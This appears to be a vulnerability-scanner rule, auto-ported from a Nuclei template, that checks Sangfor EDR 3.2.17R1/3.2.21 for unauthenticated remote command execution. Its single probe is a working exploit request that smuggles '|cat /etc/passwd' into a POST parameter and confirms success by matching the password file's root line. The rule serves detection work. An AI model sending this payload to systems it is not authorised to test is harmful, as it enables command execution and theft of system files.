schema_version: 1
id: "cortex.community:sangfor-edr-rce"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "Sangfor EDR 3.2.17R1/3.2.21 - Remote Code Execution"
  description: "Sangfor EDR 3.2.17R1/3.2.21 allows remote unauthenticated users to to execute arbitrary commands. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://www.cnblogs.com/0day-li/p/13650452.html"
  cwes: [78]
  tags: ["rce", "sangfor", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "Critical"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request:
      method: "POST"
      path: "/api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9"
      headers: { "Content-Type": "application/x-www-form-urlencoded" }
      body: "{\"params\":\"w=123\\\"'1234123'\\\"|cat /etc/passwd\"}\n"
proof:
  kind: "signal.v1"
  assertions:
    all:
      - regex: { left: { ref: "steps.probe0.body" }, right: { value: "root:.*:0:0:" } }
      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
